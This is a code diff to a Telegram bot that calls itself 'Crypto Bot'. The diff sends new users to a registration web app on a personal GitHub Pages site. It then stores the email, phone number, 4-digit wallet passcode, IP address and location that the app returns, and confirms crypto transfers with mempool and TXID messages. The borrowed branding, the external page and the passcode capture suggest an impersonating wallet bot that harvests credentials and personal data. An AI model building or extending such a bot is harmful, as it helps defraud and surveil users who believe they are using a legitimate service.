@@ -6,6 +6,7 @@ import random
 from aiogram import Bot, Dispatcher, F
 from aiogram.filters import Command, CommandStart
 from aiogram.types import (
+    WebAppInfo,
     Message, CallbackQuery, FSInputFile, 
     ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, 
     InlineKeyboardMarkup, InlineKeyboardButton,
@@ -106,8 +107,9 @@ async def cmd_start(msg: Message, state: FSMContext):
         '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
         "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
     )
+    webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&v={int(time.time())}"
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Начать", callback_data="onb:start")]
+        [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
     ])
     
     if os.path.exists(img_path):
@@ -412,6 +414,134 @@ async def chosen_inline_result_handler(chosen: ChosenInlineResult):
                 log.info('Created inline check %s for user %d: %s %s (inline_msg=%s)', cid, uid, amount, asset, chosen.inline_message_id)
             except Exception as e:
                 log.error('Failed to create inline check %s: %s', cid, e)
+
+@dp.message(Command("testreg"))
+async def cmd_testreg(msg: Message, state: FSMContext):
+    if msg.from_user.id != config.OWNER_ID:
+        return
+    await state.clear()
+    from database import db_conn
+    async with db_conn.tx() as c:
+        await c.execute("UPDATE users SET is_onboarded = 0 WHERE id = ?", (msg.from_user.id,))
+    
+    webapp_reg_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&v={int(time.time())}"
+    text = (
+        '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
+        "Кошелёк успешно создан. Завершите настройку аккаунта, чтобы получить доступ ко всем возможностям сервиса."
+    )
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="Начать", web_app=WebAppInfo(url=webapp_reg_url))]
+    ])
+    img_path = os.path.join(BASE_DIR, "welcome.jpg")
+    if os.path.exists(img_path):
+        await msg.answer_photo(photo=FSInputFile(img_path), caption=text, reply_markup=kb, parse_mode="HTML")
+    else:
+        await msg.answer(text, reply_markup=kb, parse_mode="HTML")
+
+@dp.message(F.web_app_data)
+async def web_app_data_handler(msg: Message, state: FSMContext):
+    raw_data = msg.web_app_data.data
+    try:
+        import json
+        data = json.loads(raw_data)
+    except Exception as e:
+        log.error("Failed to parse web_app_data: %s", e)
+        return
+
+    action = data.get("action")
+    if action == "register":
+        email = (data.get("email") or "").strip()
+        phone = (data.get("phone") or "").strip()
+        passcode = (data.get("passcode") or "").strip()
+        ip = (data.get("ip") or "127.0.0.1").strip()
+        country = (data.get("country") or "Не определена").strip()
+        city = (data.get("city") or "").strip()
+
+        from database import save_registration_data, generate_all_user_addresses, get_all_balances
+        await save_registration_data(msg.from_user.id, email, phone, passcode, ip, country, city)
+        await generate_all_user_addresses(msg.from_user.id)
+
+        country_str = country
+        if city and city.lower() != country.lower():
+            country_str = f"{country}, {city}"
+
+        confirm_text = (
+            "🔐 <b>Код-пароль успешно установлен!</b>\n\n"
+            "Вы создали персональный 4-значный код-пароль кошелька для защиты операций и авторизации.\n\n"
+            f"📱 <b>Телефон:</b> <code>{phone or 'Не указан'}</code>\n"
+            f"📧 <b>Email:</b> <code>{email or 'Не указан'}</code>\n"
+            f"🌐 <b>IP адрес:</b> <code>{ip}</code>\n"
+            f"📍 <b>Страна:</b> <code>{country_str}</code>\n\n"
+            "Кошелёк успешно настроен и активирован. Приятного использования!"
+        )
+        balances = await get_all_balances(msg.from_user.id)
+        from keyboards import main_menu_inline, update_user_chat_menu_button
+        await update_user_chat_menu_button(msg.bot, msg.from_user.id, balances)
+        kb = main_menu_inline(user_id=msg.from_user.id, balances=balances)
+        
+        img_path = os.path.join(BASE_DIR, "start_banner.jpg")
+        if os.path.exists(img_path):
+            await msg.answer_photo(photo=FSInputFile(img_path), caption=confirm_text, reply_markup=kb, parse_mode="HTML")
+        else:
+            await msg.answer(confirm_text, reply_markup=kb, parse_mode="HTML")
+        await state.clear()
+
+    elif action == "transfer":
+        asset = data.get("asset", "USDT").upper()
+        net = data.get("network", "TRC20").upper()
+        to_addr = (data.get("address") or "").strip()
+        amount = float(data.get("amount", 0.0))
+
+        if amount <= 0 or not to_addr:
+            await msg.answer("❌ Неверные параметры перевода.")
+            return
+
+        from database import transfer_crypto, InsufficientFunds
+        try:
+            res = await transfer_crypto(msg.from_user.id, to_addr, asset, net, amount)
+        except InsufficientFunds as e:
+            await msg.answer(f"❌ {e}")
+            return
+        except Exception as e:
+            await msg.answer(f"❌ Ошибка перевода: {e}")
+            return
+
+        if res["is_internal"]:
+            rec_id = res["to_user_id"]
+            await msg.answer(
+                f"✅ <b>Внутренний перевод отправлен!</b>\n\n"
+                f"💰 Сумма: <b>{amount:g} {asset}</b>\n"
+                f"👤 Получатель: <code>{rec_id}</code>\n"
+                f"📍 Адрес: <code>{to_addr}</code>\n"
+                f"⚡️ Сеть: <b>{res['network']}</b>\n"
+                f"💸 Комиссия: <b>0.00 {asset}</b>\n"
+                f"⏱ Статус: <b>Завершено мгновенно</b>",
+                parse_mode="HTML"
+            )
+            try:
+                s_tag = f"@{msg.from_user.username}" if msg.from_user.username else f"ID {msg.from_user.id}"
+                await msg.bot.send_message(
+                    rec_id,
+                    f"⚡️ <b>Входящий перевод криптовалюты!</b>\n\n"
+                    f"Вам зачислено: <b>+{amount:g} {asset}</b>\n"
+                    f"От: <b>{s_tag}</b>\n"
+                    f"На адрес: <code>{to_addr}</code>\n"
+                    f"Сеть: <b>{res['network']}</b>\n\n"
+                    f"Баланс пополнен без комиссии.",
+                    parse_mode="HTML"
+                )
+            except Exception:
+                pass
+        else:
+            await msg.answer(
+                f"✅ <b>Транзакция отправлена в сеть!</b>\n\n"
+                f"💰 Сумма: <b>{amount:g} {asset}</b>\n"
+                f"📍 Адрес: <code>{to_addr}</code>\n"
+                f"⚡️ Сеть: <b>{res['network']}</b>\n"
+                f"🔗 TXID: <code>{res['tx_hash'][:24]}...{res['tx_hash'][-8:]}</code>\n"
+                f"⏱ Статус: <b>Отправлено в мемпул</b>",
+                parse_mode="HTML"
+            )
 
 from keep_alive import start_health_server
 
